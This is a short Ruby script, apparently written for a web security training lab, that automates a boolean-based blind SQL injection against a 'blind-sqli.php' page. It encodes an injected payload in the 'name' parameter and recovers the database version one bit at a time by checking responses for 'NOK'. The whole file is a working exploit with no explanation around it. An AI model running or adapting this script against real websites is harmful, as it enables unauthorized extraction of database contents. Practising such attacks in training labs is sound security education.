require "net/http"
require "uri"

url = URI.parse("http://web4.training/blind-sqli.php")
headers = {'Cookie' => "LOL=CATS"}
i = 1
char = 1
until char == 0
    char = 0
#    puts "testing character %d" % i
    [1,2,4,8,16,32,64].each do |bit|
        data = sprintf("http://web4.training/blind-sqli.php?name=admin%%27+and+(ascii(substring((select+@@version),%d,1))%%26%d)%%3d%d+--+", i, bit, bit)
#        puts data
       url = URI.parse(data)
#       req = Net::HTTP::Get.new(url.path)
#       puts url.path
       response = Net::HTTP.start(url.host, url.port) {|http|
           http.get(url.request_uri, headers)
        }
#        puts response.body
       if response.body !~ /NOK/ then
           char += bit
       end
    end
#    print "char is %b" % char
    print "%c" % char
    i += 1
end
